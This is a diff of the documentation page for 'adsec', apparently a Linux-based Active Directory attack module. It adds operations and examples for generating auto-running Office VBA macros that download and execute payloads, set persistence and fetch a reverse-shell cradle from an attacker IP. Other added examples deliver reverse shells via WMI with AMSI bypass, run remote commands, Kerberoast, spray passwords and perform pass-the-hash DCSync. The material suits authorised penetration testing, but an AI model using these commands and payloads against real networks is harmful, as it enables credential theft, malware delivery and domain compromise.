@@ -621,23 +621,24 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
     <div class="module-meta">
       <div>
         <h1 class="module-title">adsec<span>.</span></h1>
-        <p class="module-sub">Linux-side Active Directory penetration testing module. DC discovery, LDAP enumeration, Kerberoasting, AS-REP roasting, password spraying, DCSync, and BloodHound collection — all from a single Linux attack box. 15 operations, 2 auto pipelines.</p>
+        <p class="module-sub">Linux-side Active Directory penetration testing module. DC discovery, LDAP enumeration, Kerberoasting, AS-REP roasting, password spraying, DCSync, BloodHound collection, remote exec, privesc audit, reverse shell delivery, and Office VBA macro generation — all from a single Linux attack box.</p>
         <div class="module-tags">
           <span class="tag hi">secV Module</span>
           <span class="tag">Active Directory</span>
           <span class="tag">Kerberoast</span>
           <span class="tag">BloodHound</span>
           <span class="tag">DCSync</span>
+          <span class="tag">Office Macros</span>
           <span class="tag">Python 3</span>
-          <span class="tag">Stable</span>
+          <span class="tag">v1.0.2</span>
         </div>
       </div>
       <div class="module-stats">
-        <div class="stat-row"><span class="stat-lbl">Category</span><span class="stat-v">Network · Active Directory</span></div>
-        <div class="stat-row"><span class="stat-lbl">Status</span><span class="stat-v">Stable</span></div>
-        <div class="stat-row"><span class="stat-lbl">Location</span><span class="stat-v">tools/network/adsec/</span></div>
+        <div class="stat-row"><span class="stat-lbl">Category</span><span class="stat-v">AD / Linux</span></div>
+        <div class="stat-row"><span class="stat-lbl">Version</span><span class="stat-v">1.0.2</span></div>
+        <div class="stat-row"><span class="stat-lbl">Location</span><span class="stat-v">tools/AD/linux/</span></div>
         <div class="stat-row"><span class="stat-lbl">Entry</span><span class="stat-v">python3 adsec.py</span></div>
-        <div class="stat-row"><span class="stat-lbl">Operations</span><span class="stat-v">15 (13 std + 2 auto)</span></div>
+        <div class="stat-row"><span class="stat-lbl">Operations</span><span class="stat-v">17 (16 std + 1 auto)</span></div>
         <div class="stat-row"><span class="stat-lbl">License</span><span class="stat-v">MIT</span></div>
       </div>
     </div>
@@ -654,6 +655,7 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><a href="#quickstart">Quick Start</a></li>
         <li><div class="sidebar-sep">Reference</div></li>
         <li><a href="#operations">Operations</a></li>
+        <li><a href="#redteam">Red Team</a></li>
         <li><a href="#params">Parameters</a></li>
         <li><div class="sidebar-sep">More</div></li>
         <li><a href="#examples">Examples</a></li>
@@ -675,7 +677,7 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
           <div class="feat-cell">
             <div class="feat-icon">Discovery</div>
             <div class="feat-name">Unauthenticated</div>
-            <div class="feat-desc">DC discovery, SMB null sessions, RPC endpoint mapping, anonymous LDAP bind — no credentials needed.</div>
+            <div class="feat-desc">DC discovery via DNS SRV records, LDAP probe, SMB version fingerprint, open port scan, and anonymous LDAP bind — no credentials needed.</div>
           </div>
           <div class="feat-cell">
             <div class="feat-icon">Enumeration</div>
@@ -700,7 +702,7 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
           <div class="feat-cell">
             <div class="feat-icon">Pipelines</div>
             <div class="feat-name">Auto Chains</div>
-            <div class="feat-desc">auto: no-cred safe chain. auto_auth: full authenticated chain ending in BloodHound ZIP.</div>
+            <div class="feat-desc"><code>auto</code>: adaptive pipeline — vulncheck → users → groups → shares → passpol always; kerberoast → asreproast → bloodhound → loot → privesc_check when credentials are supplied.</div>
           </div>
         </div>
         <div class="callout warn">
@@ -717,7 +719,7 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <pre><code><span class="comment"># Unauthenticated DC discovery — no credentials needed</span>
 echo '{
   "target": "192.168.1.10",
-  "params": { "operation": "dc_discover", "domain": "corp.local" }
+  "params": { "operation": "discover", "domain": "corp.local" }
 }' | python3 adsec.py | jq .
 
 <span class="comment"># Kerberoasting — requests TGS for all SPNs, saves hashes</span>
@@ -728,22 +730,22 @@ echo '{
     "domain": "corp.local",
     "username": "jdoe",
     "password": "Password123",
-    "output": "/tmp/kerberoast_hashes.txt"
+    "output_dir": "/tmp/adsec-loot"
   }
 }' | python3 adsec.py
 
-<span class="comment"># Full unauthenticated auto pipeline</span>
+<span class="comment"># Adaptive auto pipeline (unauthenticated)</span>
 echo '{
   "target": "corp.local",
   "params": {
     "operation": "auto",
     "domain": "corp.local",
-    "output": "/tmp/adsec_auto"
+    "output_dir": "/tmp/adsec-loot"
   }
 }' | python3 adsec.py | jq .data</code></pre>
         <div class="callout info">
           <span class="callout-mark">i</span>
-          The default operation is <code>dc_discover</code>. If no <code>operation</code> key is provided in params, adsec runs DC discovery automatically. All other operations require an explicit operation name.
+          The default operation is <code>discover</code>. If no <code>operation</code> key is provided in params, adsec runs DC discovery automatically. All other operations require an explicit operation name.
         </div>
       </section>
 
@@ -751,43 +753,35 @@ echo '{
       <section id="operations">
         <p class="sec-label">Reference</p>
         <h2>Operations</h2>
-        <p>adsec provides 15 operations across four categories. Pass the operation name as <code>params.operation</code> in the JSON input.</p>
+        <p>adsec provides 16 operations across five categories plus one adaptive auto pipeline. Pass the operation name as <code>params.operation</code> in the JSON input.</p>
 
         <h3>Discovery (unauthenticated)</h3>
-        <p>These four operations require no credentials. They are safe to run without lockout risk and form the basis of the <code>auto</code> pipeline.</p>
+        <p>Initial discovery runs automatically before any operation. Run it explicitly to get DC fingerprint data without further actions.</p>
         <div class="mode-grid">
           <div class="mode-card">
-            <div class="mode-key">dc_discover <span class="mode-badge dflt">default</span></div>
-            <div class="mode-desc">Find domain controllers via DNS SRV record queries and LDAP probes. No credentials required. Returns DC hostnames, IPs, and site information.</div>
-          </div>
-          <div class="mode-card">
-            <div class="mode-key">smb_enum <span class="mode-badge">no creds</span></div>
-            <div class="mode-desc">SMB share enumeration via null session. Fingerprints SMB version, signing status, and lists accessible shares. Uses netexec.</div>
-          </div>
-          <div class="mode-card">
-            <div class="mode-key">rpc_enum <span class="mode-badge">no creds</span></div>
-            <div class="mode-desc">RPC endpoint mapping via MSRPC. Enumerates users and groups through the SAMR and LSARPC pipes without credentials where permitted.</div>
-          </div>
-          <div class="mode-card">
-            <div class="mode-key">ldap_anon <span class="mode-badge">no creds</span></div>
-            <div class="mode-desc">Anonymous LDAP bind attempt. Discovers base DN, naming contexts, and any attributes exposed to anonymous readers.</div>
+            <div class="mode-key">discover <span class="mode-badge dflt">default</span></div>
+            <div class="mode-desc">Domain controller discovery via DNS SRV records, LDAP probe, SMB version fingerprint, open port scan, and anonymous LDAP bind attempt. No credentials required. Discovery output feeds into all subsequent operations automatically.</div>
           </div>
         </div>
 
-        <h3>Authenticated enumeration</h3>
-        <p>These operations require valid domain credentials (username + password or NTLM hash). They perform deep enumeration of the AD environment.</p>
+        <h3>Domain enumeration</h3>
+        <p>These operations enumerate users, groups, shares, and password policy. They operate unauthenticated where the DC permits (SAMR null session, anonymous SMB) and use authenticated LDAP/SMB when credentials are provided.</p>
         <div class="mode-grid">
           <div class="mode-card">
-            <div class="mode-key">ldap_enum <span class="mode-badge">auth</span></div>
-            <div class="mode-desc">Full authenticated LDAP dump: all users, groups, GPOs, OUs, password policies, domain trusts, and ACL relationships via ldap3.</div>
+            <div class="mode-key">users <span class="mode-badge">anon/auth</span></div>
+            <div class="mode-desc">Enumerate domain user accounts. Uses authenticated LDAP if credentials are provided, falls back to SAMR RID cycling via null session otherwise. Returns username, description, last logon, password flags, and disabled status.</div>
           </div>
           <div class="mode-card">
-            <div class="mode-key">user_enum <span class="mode-badge">auth</span></div>
-            <div class="mode-desc">Enumerate all domain user accounts. Flags disabled accounts, never-expire password flags, last logon timestamps, and accounts with no pre-auth required.</div>
+            <div class="mode-key">groups <span class="mode-badge">auth</span></div>
+            <div class="mode-desc">Enumerate domain groups via authenticated LDAP with full nested membership resolution. Highlights AdminSDHolder-protected accounts and privileged group members (Domain Admins, Enterprise Admins, etc.).</div>
           </div>
           <div class="mode-card">
-            <div class="mode-key">group_enum <span class="mode-badge">auth</span></div>
-            <div class="mode-desc">Enumerate all domain groups with full nested membership resolution. Highlights AdminSDHolder-protected accounts and privileged group members.</div>
+            <div class="mode-key">shares <span class="mode-badge">anon/auth</span></div>
+            <div class="mode-desc">SMB share enumeration. Lists all shares on the DC, checks read and write access per share. Works via null session (no creds) or authenticated SMB.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">passpol <span class="mode-badge">anon/auth</span></div>
+            <div class="mode-desc">Retrieve domain password policy: minimum length, complexity requirements, lockout threshold, lockout duration, and observation window. <code>spray</code> calls this automatically to calculate safe attempt limits.</div>
           </div>
         </div>
 
@@ -796,15 +790,15 @@ echo '{
         <div class="mode-grid">
           <div class="mode-card">
             <div class="mode-key">kerberoast <span class="mode-badge">creds</span></div>
-            <div class="mode-desc">Kerberoasting: requests TGS tickets for all accounts with registered SPNs. Saves RC4/AES hashes to output file for offline cracking with hashcat.</div>
+            <div class="mode-desc">Request TGS tickets for all accounts with registered SPNs. Saves RC4/AES hashes to <code>output_dir</code> in hashcat format (-m 13100) for offline cracking. Requires credentials.</div>
           </div>
           <div class="mode-card">
             <div class="mode-key">asreproast <span class="mode-badge">no creds</span></div>
-            <div class="mode-desc">AS-REP roasting: finds accounts with DONT_REQUIRE_PREAUTH set and dumps their AS-REP hashes for offline cracking. No credentials required.</div>
+            <div class="mode-desc">Dump AS-REP hashes for accounts with DONT_REQUIRE_PREAUTH set. Requires a <code>userlist</code> or a prior <code>users</code> run. Saves hashes in hashcat format (-m 18200).</div>
           </div>
           <div class="mode-card">
             <div class="mode-key">spray <span class="mode-badge">careful</span></div>
-            <div class="mode-desc">Lockout-aware password spraying. Detects lockout threshold via LDAP policy query, enforces configurable delay between rounds, applies per-account jitter to avoid pattern detection.</div>
+            <div class="mode-desc">Lockout-aware password spraying. Queries the domain lockout threshold via <code>passpol</code> before starting, enforces per-round delays and per-account jitter. Requires <code>userlist</code> and <code>single_password</code> or <code>passlist</code>.</div>
           </div>
         </div>
         <div class="callout crit">
@@ -812,30 +806,85 @@ echo '{
           The <code>spray</code> operation reads the domain lockout policy before starting. If <code>lockout_threshold</code> cannot be determined automatically, it defaults to 3 attempts per account. Always verify the lockout window with the domain owner before running spray against a production environment.
         </div>
 
-        <h3>Post-authentication</h3>
-        <p>These operations require elevated credentials — typically a domain admin or account with DCSync rights.</p>
+        <h3>Vulnerability &amp; intelligence</h3>
+        <p>These operations check for exploitable conditions, collect BloodHound graph data, loot accessible file shares, and dump domain secrets.</p>
         <div class="mode-grid">
           <div class="mode-card">
-            <div class="mode-key">secretsdump <span class="mode-badge">priv</span></div>
-            <div class="mode-desc">DCSync via impacket secretsdump. Dumps all NTLM hashes, Kerberos keys, and domain secrets. Supports pass-the-hash with the hash parameter.</div>
+            <div class="mode-key">vulncheck <span class="mode-badge">no creds</span></div>
+            <div class="mode-desc">Check for known AD vulnerabilities: EternalBlue (MS17-010), PrintNightmare (CVE-2021-1675), noPac (CVE-2021-42278/42287), Zerologon (CVE-2020-1472), and anonymous LDAP exposure. Uses discovery data — no credentials required.</div>
           </div>
           <div class="mode-card">
-            <div class="mode-key">bloodhound <span class="mode-badge">auth</span></div>
-            <div class="mode-desc">BloodHound data collection via bloodhound-python using all collection methods. Output is a ZIP archive ready for import into BloodHound CE.</div>
+            <div class="mode-key">bloodhound <span class="mode-badge">creds</span></div>
+            <div class="mode-desc">BloodHound data collection via bloodhound-python using all collection methods. Output is a ZIP archive in <code>output_dir</code>, ready for import into BloodHound CE.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">loot <span class="mode-badge">anon/auth</span></div>
+            <div class="mode-desc">Hunt for sensitive files across all accessible SMB shares. Matches filenames against patterns for credentials, config files, and scripts. Calls <code>shares</code> first if no share list is in the current run's data.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">secrets <span class="mode-badge">priv</span></div>
+            <div class="mode-desc">DCSync via impacket secretsdump. Dumps all NTLM hashes, Kerberos keys, and domain secrets from NTDS.dit. Requires domain admin rights or DCSync-delegated permissions. Supports pass-the-hash.</div>
           </div>
         </div>
 
-        <h3>Auto pipelines</h3>
-        <p>Two built-in chained pipelines cover the most common engagement workflows. Both run constituent operations sequentially and aggregate their output into a single JSON result.</p>
+        <h3>Remote execution</h3>
+        <p>Execute commands or run audits on a remote Windows target using impacket wmiexec. Credentials are required for both operations.</p>
         <div class="mode-grid">
           <div class="mode-card">
-            <div class="mode-key">auto <span class="mode-badge">safe</span></div>
-            <div class="mode-desc">Safe no-credential pipeline: dc_discover → smb_enum → ldap_anon → kerberoast → asreproast. No lockout-risk operations. Suitable for initial unauthenticated engagement phase.</div>
+            <div class="mode-key">exec <span class="mode-badge">creds</span></div>
+            <div class="mode-desc">Remote command execution via impacket wmiexec. Pass <code>command</code> in params. Returns stdout and stderr. Supports pass-the-hash with the <code>hash</code> parameter.</div>
           </div>
           <div class="mode-card">
-            <div class="mode-key">auto_auth <span class="mode-badge">full</span></div>
-            <div class="mode-desc">Authenticated full pipeline: ldap_enum → user_enum → group_enum → kerberoast → asreproast → bloodhound. Requires domain credentials. Produces complete AD picture and BloodHound ZIP.</div>
+            <div class="mode-key">privesc_check <span class="mode-badge">creds</span></div>
+            <div class="mode-desc">PowerShell privilege-escalation audit delivered via WMI with AMSI bypass. Checks unquoted service paths, writable service binaries, stored credentials in registry, UAC configuration, PATH hijack vectors, and elevated autoruns.</div>
           </div>
+        </div>
+
+        <h3>Auto pipeline</h3>
+        <p>Built-in adaptive pipeline covering both unauthenticated and authenticated engagement phases. Runs operations sequentially and aggregates output into a single JSON result.</p>
+        <div class="mode-grid">
+          <div class="mode-card">
+            <div class="mode-key">auto <span class="mode-badge">adaptive</span></div>
+            <div class="mode-desc">Always runs: vulncheck → users → groups → shares → passpol. With credentials also runs: kerberoast → asreproast → bloodhound → loot → privesc_check. Without credentials, runs asreproast if <code>userlist</code> is provided.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Red Team -->
+      <section id="redteam">
+        <p class="sec-label">Operations</p>
+        <h2>Red team payloads</h2>
+        <p>Two community-contributed operations for payload generation and reverse shell delivery against Windows AD targets, operated from Linux.</p>
+
+        <h3>office_macros</h3>
+        <p>Generates ready-to-paste VBA macro templates for Office documents. All macros fire on <code>AutoOpen()</code>. Paste into the VBA editor (<kbd>Alt+F11</kbd>), save as <code>.docm</code> or <code>.xlsm</code>. Identical template set to winadsec for cross-module consistency.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>macro_type</th><th>Technique</th><th>Key parameters</th></tr></thead>
+            <tbody>
+              <tr><td>download_exec</td><td>MSXML2.XMLHTTP + ADODB.Stream → execute</td><td>payload_url</td></tr>
+              <tr><td>hidden_cmd_exec</td><td>bitsadmin download + hidden cmd.exe start</td><td>payload_url</td></tr>
+              <tr><td>persistence</td><td>HKCU Run key via WScript.Shell.RegWrite</td><td>reg_path</td></tr>
+              <tr><td>pwsh_cmd</td><td>Hidden PowerShell with execution-policy bypass</td><td>ps_command</td></tr>
+              <tr><td>reverse_shell</td><td>IEX DownloadString PowerShell cradle via cmd.exe</td><td>rev_url, lhost, lport</td></tr>
+              <tr><td>all</td><td>All five templates in one call</td><td>—</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>shell</h3>
+        <p>Generates a reverse shell payload via the <code>revshell</code> module. If credentials are provided, auto-delivers it to the target via WMI exec and starts a listener. Without credentials, outputs the payload command for manual delivery.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Default</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>lhost</td><td>auto-detect</td><td>Listener IP. Defaults to local interface IP.</td></tr>
+              <tr><td>lport</td><td>4444</td><td>Listener port.</td></tr>
+              <tr><td>payload_type</td><td>powershell_b64</td><td>Any type supported by revshell (powershell_b64, cmd_nc, etc.)</td></tr>
+              <tr><td>serve</td><td>true</td><td>If true, start interactive multi-session server. If false, listen for <code>duration</code> seconds.</td></tr>
+              <tr><td>duration</td><td>120</td><td>Single-connection listen timeout (when serve=false).</td></tr>
+            </tbody>
+          </table>
         </div>
       </section>
 
@@ -849,7 +898,7 @@ echo '{
             <thead><tr><th>Parameter</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
             <tbody>
               <tr><td>target</td><td>string</td><td>required</td><td>DC IP address or domain FQDN (e.g. <code>192.168.1.10</code> or <code>corp.local</code>)</td></tr>
-              <tr><td>operation</td><td>string</td><td>dc_discover</td><td>Operation name. See the Operations section for all valid values.</td></tr>
+              <tr><td>operation</td><td>string</td><td>discover</td><td>Operation name. See the Operations section for all valid values.</td></tr>
               <tr><td>domain</td><td>string</td><td>""</td><td>Domain name in FQDN format, e.g. <code>corp.local</code>. Required for most operations.</td></tr>
               <tr><td>username</td><td>string</td><td>""</td><td>Domain username for authenticated operations. Combine with <code>password</code> or <code>hash</code>.</td></tr>
               <tr><td>password</td><td>string</td><td>""</td><td>Domain password for authenticated operations. Mutually exclusive with <code>hash</code>.</td></tr>
@@ -876,20 +925,20 @@ echo '{
         <p class="sec-label">Examples</p>
         <h2>Examples</h2>
 
-        <h3>Unauthenticated DC and SMB discovery</h3>
+        <h3>DC discovery</h3>
         <pre><code>echo '{
   "target": "10.10.10.5",
   "params": {
-    "operation": "dc_discover",
+    "operation": "discover",
     "domain": "htb.local"
   }
-}' | python3 adsec.py | jq '.data.domain_controllers'
+}' | python3 adsec.py | jq '.data.domain_info'
 
-<span class="comment"># Follow up with SMB null session enum</span>
+<span class="comment"># Follow up with SMB share enumeration</span>
 echo '{
   "target": "10.10.10.5",
   "params": {
-    "operation": "smb_enum",
+    "operation": "shares",
     "domain": "htb.local"
   }
 }' | python3 adsec.py | jq '.data.shares'</code></pre>
@@ -898,57 +947,106 @@ echo '{
         <pre><code>echo '{
   "target": "192.168.100.5",
   "params": {
-    "operation": "kerberoast",
-    "domain": "corp.local",
-    "username": "jdoe",
-    "password": "Summer2024!",
-    "output": "/tmp/kerb_hashes.txt"
+    "operation":  "kerberoast",
+    "domain":     "corp.local",
+    "username":   "jdoe",
+    "password":   "Summer2024!",
+    "output_dir": "/tmp/adsec-loot"
   }
 }' | python3 adsec.py
 
 <span class="comment"># Crack hashes offline</span>
-hashcat -m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+hashcat -m 13100 /tmp/adsec-loot/kerberoast-*.hashes /usr/share/wordlists/rockyou.txt</code></pre>
 
         <h3>AS-REP roasting (no credentials)</h3>
         <pre><code>echo '{
   "target": "dc01.corp.local",
   "params": {
-    "operation": "asreproast",
-    "domain": "corp.local",
-    "output": "/tmp/asrep_hashes.txt"
+    "operation":  "asreproast",
+    "domain":     "corp.local",
+    "userlist":   "/tmp/users.txt",
+    "output_dir": "/tmp/adsec-loot"
   }
-}' | python3 adsec.py | jq '.data.vulnerable_accounts'
+}' | python3 adsec.py | jq '.data.asreproast | length'
 
 <span class="comment"># Crack AS-REP hashes</span>
-hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+hashcat -m 18200 /tmp/adsec-loot/asreproast-*.hashes /usr/share/wordlists/rockyou.txt</code></pre>
 
-        <h3>Pass-the-hash DCSync with secretsdump</h3>
+        <h3>Pass-the-hash DCSync</h3>
         <pre><code>echo '{
   "target": "192.168.1.10",
   "params": {
-    "operation": "secretsdump",
-    "domain": "corp.local",
-    "username": "Administrator",
-    "hash": "00000000000000000000000000000000:fc525c9683e8fe067095ba2ddc971889",
-    "output": "/tmp/dcsync_output.txt"
+    "operation":  "secrets",
+    "domain":     "corp.local",
+    "username":   "Administrator",
+    "hash":       "00000000000000000000000000000000:fc525c9683e8fe067095ba2ddc971889",
+    "output_dir": "/tmp/adsec-loot"
   }
-}' | python3 adsec.py | jq '.data.accounts | length'</code></pre>
+}' | python3 adsec.py | jq '.data.secrets'</code></pre>
 
-        <h3>Full authenticated auto pipeline with BloodHound collection</h3>
+        <h3>Remote command execution</h3>
         <pre><code>echo '{
   "target": "192.168.1.10",
   "params": {
-    "operation": "auto_auth",
-    "domain": "corp.local",
-    "username": "pentest",
-    "password": "P@ssw0rd",
-    "output": "/tmp/adsec_results"
+    "operation": "exec",
+    "domain":    "corp.local",
+    "username":  "jdoe",
+    "password":  "Password123",
+    "command":   "whoami /all"
+  }
+}' | python3 adsec.py | jq '.data.exec'</code></pre>
+
+        <h3>Privilege escalation audit</h3>
+        <pre><code>echo '{
+  "target": "192.168.1.10",
+  "params": {
+    "operation":  "privesc_check",
+    "domain":     "corp.local",
+    "username":   "jdoe",
+    "password":   "Password123",
+    "output_dir": "/tmp/adsec-loot"
+  }
+}' | python3 adsec.py | jq '.data.privesc'</code></pre>
+
+        <h3>Office macros — reverse shell cradle</h3>
+        <pre><code>echo '{
+  "target": "192.168.1.10",
+  "params": {
+    "operation":  "office_macros",
+    "macro_type": "reverse_shell",
+    "rev_url":    "http://192.168.1.114:8080/reverse.ps1"
+  }
+}' | python3 adsec.py | jq '.data.office_macros.macros.reverse_shell'</code></pre>
+
+        <h3>Reverse shell — auto-deliver via wmiexec</h3>
+        <pre><code>echo '{
+  "target": "192.168.1.10",
+  "params": {
+    "operation":    "shell",
+    "domain":       "corp.local",
+    "username":     "Administrator",
+    "password":     "P@ssword1",
+    "lhost":        "192.168.1.114",
+    "lport":        4444,
+    "payload_type": "powershell_b64"
+  }
+}' | python3 adsec.py</code></pre>
+
+        <h3>Authenticated auto pipeline with BloodHound</h3>
+        <pre><code>echo '{
+  "target": "192.168.1.10",
+  "params": {
+    "operation":  "auto",
+    "domain":     "corp.local",
+    "username":   "pentest",
+    "password":   "P@ssw0rd",
+    "output_dir": "/tmp/adsec-loot"
   }
 }' | python3 adsec.py | jq '{
-  users: .data.user_enum.count,
-  groups: .data.group_enum.count,
-  kerberoastable: (.data.kerberoast.hashes | length),
-  asreproastable: (.data.asreproast.hashes | length),
+  users:          (.data.users | length),
+  groups:         (.data.groups | length),
+  kerberoastable: (.data.kerberoast | length),
+  asreproastable: (.data.asreproast | length),
   bloodhound_zip: .data.bloodhound.output_file
 }'</code></pre>
       </section>
@@ -960,17 +1058,17 @@ hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt</code></
           <table>
             <thead><tr><th>Dependency</th><th>Install</th><th>Used by</th></tr></thead>
             <tbody>
-              <tr><td>impacket</td><td><code>pip3 install impacket</code></td><td>secretsdump (DCSync), Kerberos ticket requests, SMB/RPC operations</td></tr>
-              <tr><td>ldap3</td><td><code>pip3 install ldap3</code></td><td>ldap_anon, ldap_enum, user_enum, group_enum — all LDAP operations</td></tr>
-              <tr><td>nxc (netexec)</td><td><code>pip3 install netexec</code></td><td>smb_enum, rpc_enum, spray — SMB/RPC/auth operations</td></tr>
-              <tr><td>bloodhound-python</td><td><code>pip3 install bloodhound</code></td><td>bloodhound operation and auto_auth pipeline BloodHound collection</td></tr>
-              <tr><td>python3-dnspython</td><td><code>pip3 install dnspython</code></td><td>dc_discover — DNS SRV record queries for DC location</td></tr>
+              <tr><td>impacket</td><td><code>pip3 install impacket</code></td><td>secrets (DCSync), kerberoast, asreproast, exec, privesc_check — Kerberos, SMB/RPC, and WMI operations</td></tr>
+              <tr><td>ldap3</td><td><code>pip3 install ldap3</code></td><td>users, groups, passpol — all LDAP enumeration operations</td></tr>
+              <tr><td>nxc (netexec)</td><td><code>pip3 install netexec</code></td><td>spray, shares — SMB auth and share enumeration</td></tr>
+              <tr><td>bloodhound-python</td><td><code>pip3 install bloodhound</code></td><td>bloodhound operation and auto pipeline BloodHound collection</td></tr>
+              <tr><td>python3-dnspython</td><td><code>pip3 install dnspython</code></td><td>discover — DNS SRV record queries for DC location</td></tr>
             </tbody>
           </table>
         </div>
         <div class="callout info">
           <span class="callout-mark">i</span>
-          All five dependencies are checked at startup. If a dependency is missing, adsec reports which operations are unavailable and exits cleanly rather than failing mid-operation. Install all five for full functionality across all 15 operations.
+          All five dependencies are checked at startup. If a dependency is missing, adsec reports which operations are unavailable and exits cleanly rather than failing mid-operation. Install all five for full functionality across all 16 operations.
         </div>
         <p>All dependencies are available via pip3 and are present by default on Kali Linux and BlackArch. On Arch Linux and Debian, install them with pip3 inside a virtual environment or use the system package manager where packages are available (e.g. <code>python3-impacket</code> on Debian).</p>
       </section>
